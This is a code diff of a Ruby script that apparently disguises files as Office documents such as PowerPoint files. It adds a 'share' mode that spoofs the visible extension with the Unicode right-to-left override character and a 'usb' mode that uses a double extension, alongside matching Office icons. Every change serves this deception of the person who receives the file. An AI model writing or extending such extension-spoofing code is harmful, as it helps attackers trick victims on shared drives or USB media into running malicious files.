@@ -20,9 +20,13 @@ OptionParser.new do |opts|
     options[:ext] = ext
   end
 
-  opts.on("-f", "--fake", "fake file extension") do
-    options[:fake] = true
+  opts.on("-t", "--type share, usb", "file stored type") do |type|
+    options[:type] = type
   end
+
+  # opts.on("-f", "--fake", "fake file extension") do
+  #   options[:fake] = true
+  # end
 
 end.parse!
 
@@ -49,19 +53,23 @@ when 'pptx'
   options[:icon] = "PowerPoint-orange.ico"
   options[:fake_ext] = "pptx"
 else
-  puts "[!] Extension not supported"
+  puts "[!] Extension not supported."
   exit
 end
 
 if File.exists?(options[:input])
   filename, extension = options[:output].split('.')
-  if options[:fake]
+  case options[:type]
+  when 'share'
     options[:output] = filename + "\u202E" + options[:fake_ext].reverse! + "." + extension
-  else
+  when 'usb'
     options[:output] = filename + "." + options[:fake_ext] + "." + extension
+  else
+    puts "[!] Type not found."
+    exit
   end
 else
-  puts "[!] Input file not found"
+  puts "[!] Input file not found."
   exit
 end
 
